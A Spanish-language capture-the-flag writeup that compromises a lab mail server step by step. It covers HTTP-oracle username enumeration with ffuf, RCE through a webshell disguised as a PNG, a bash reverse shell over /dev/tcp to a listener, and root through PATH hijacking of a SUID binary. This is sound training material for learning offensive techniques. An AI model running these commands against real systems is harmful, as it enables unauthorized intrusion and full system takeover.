# Operación Pescador — Writeup Técnico

**Plataforma:** The Hackers Labs
**Objetivo:** mail.innovasolutions.thl
**Dificultad:** [indica aquí la dificultad de la máquina]

## Resumen

Máquina Linux que combina enumeración de usuarios vía oráculo de respuestas HTTP, descubrimiento de un endpoint con RCE camuflado como imagen, y escalada de privilegios mediante PATH Hijacking sobre un binario SUID.

## Cadena de ataque

| Fase | Técnica | Herramienta |
|---|---|---|
| Reconocimiento | Escaneo de puertos y servicios | Nmap |
| Enumeración de usuarios | Oráculo de respuestas en recuperación de contraseña | curl, ffuf |
| Descubrimiento de contenido | Listado de directorio abierto | Gobuster, curl |
| Acceso inicial | RCE vía parámetro sin sanitizar | curl |
| Post-explotación | Reverse shell + PTY | Netcat, Python |
| Escalada de privilegios | PATH Hijacking en binario SUID | find, análisis de binario |

## 1. Reconocimiento

```bash
nmap -sC -sV -p- -oN nmap_full_pescador.txt 10.0.2.10
```

Se identificaron SSH (22) y un servidor Apache (80) sirviendo "InnovaSolutions Webmail", con el hostname real `mail.innovasolutions.thl`.

```bash
echo "10.0.2.10 mail.innovasolutions.thl" | sudo tee -a /etc/hosts
```

Necesario porque el servidor usa virtual hosting: responde de forma distinta según el dominio con el que se le contacte.

## 2. Enumeración de usuarios (oráculo en "recuperar contraseña")

```bash
curl -s -X POST http://mail.innovasolutions.thl/forgot_password.php \
  -d "username=laptop" -o /tmp/valid.html \
  -w "HTTP_CODE:%{http_code} SIZE:%{size_download} TIME:%{time_total}\n"

curl -s -X POST http://mail.innovasolutions.thl/forgot_password.php \
  -d "username=usuarioquenoexiste123" -o /tmp/invalid.html \
  -w "HTTP_CODE:%{http_code} SIZE:%{size_download} TIME:%{time_total}\n"

diff /tmp/valid.html /tmp/invalid.html
```

El formulario devuelve un mensaje distinto según si el usuario existe o no ("¡Correo de recuperación enviado!" vs "Cuenta no válida"), lo que permite enumerar usuarios válidos.

Escalado con ffuf sobre una wordlist de +10 millones de nombres:

```bash
ffuf -u http://mail.innovasolutions.thl/forgot_password.php \
  -X POST \
  -d "username=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -mr "Correo de recuperación enviado" \
  -o ffuf_users3.json
```

Único usuario válido confirmado: **laptop**.

## 3. Descubrimiento de contenido

```bash
gobuster dir -u http://mail.innovasolutions.thl \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,pdf,jpg,png \
  -o gobuster_common.txt
```

Se encontró `/uploads/` con listado de directorio activo (fallo de configuración), exponiendo `foto.png.php` — doble extensión para camuflar código PHP ejecutable como imagen.

## 4. Descubrimiento del parámetro vulnerable (RCE)

```bash
for param in cmd file page path url exec debug id name img image file_name filename action fn do; do
  echo "=== $param ==="
  curl -s "http://mail.innovasolutions.thl/uploads/foto.png.php?${param}=id" -w " [HTTP:%{http_code}]\n"
done
```

El parámetro **cmd** fue el único que devolvió HTTP 200, confirmando ejecución remota de comandos. La salida se inyectaba dentro de un chunk de metadatos del PNG generado — visible inspeccionando en hexadecimal:

```bash
curl -s "http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=id" | xxd | head -20
```

Resultado: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

## 5. Reverse shell e interactividad

```bash
# Listener
nc -lvnp 4444

# Payload
curl -s "http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.0.2.15/4444%200%3E%261%22"
```

Upgrade a PTY completa:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z en Kali:
stty raw -echo; fg
export TERM=xterm
```

## 6. Escalada de privilegios — PATH Hijacking

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

Se encontró `/usr/local/bin/get-report`, propiedad de "laptop", con bit SUID activo.

```bash
ls -la /usr/local/bin/get-report
head -c 20 /usr/local/bin/get-report | od -A x -t x1z
grep -a -o '[[:print:]]\{4,\}' /usr/local/bin/get-report
```

Las cadenas extraídas del binario revelaron que ejecuta `cat /home/laptop/.report.txt` **sin ruta absoluta** — vulnerable a PATH Hijacking.

Explotación:

```bash
mkdir -p /tmp/exploit
cd /tmp/exploit
cat << 'EOF' > cat
#!/bin/bash
/bin/bash -p
EOF
chmod +x cat

export PATH=/tmp/exploit:$PATH
/usr/local/bin/get-report
```

Al ejecutarse el binario SUID, busca `cat` en el PATH y encuentra primero la versión falsa, que hereda privilegios root al ejecutarse.

## 7. Confirmación de acceso root

```bash
whoami
id
/bin/cat /root/root.txt
```

> Se usaron rutas absolutas (`/bin/cat`) para evitar invocar el "cat" falso todavía activo en el PATH.

Acceso root confirmado y flags capturadas (flag omitida de este writeup por buena práctica ante otros usuarios de la plataforma).

## Conclusión

Esta máquina combina tres fallos habituales en entornos reales:
1. **Fuga de información** por respuestas HTTP inconsistentes (oráculo de enumeración)
2. **Filtro de subida de archivos insuficiente** que permite ejecución de código camuflado
3. **Mala programación de binarios con privilegios elevados** (llamadas sin ruta absoluta)

Un ejemplo claro de cómo pequeños descuidos de configuración, encadenados, pueden derivar en compromiso total del sistema.

---

*Herramientas usadas: Nmap, curl, ffuf, Gobuster, ExifTool, Netcat, Python, find, John the Ripper.*
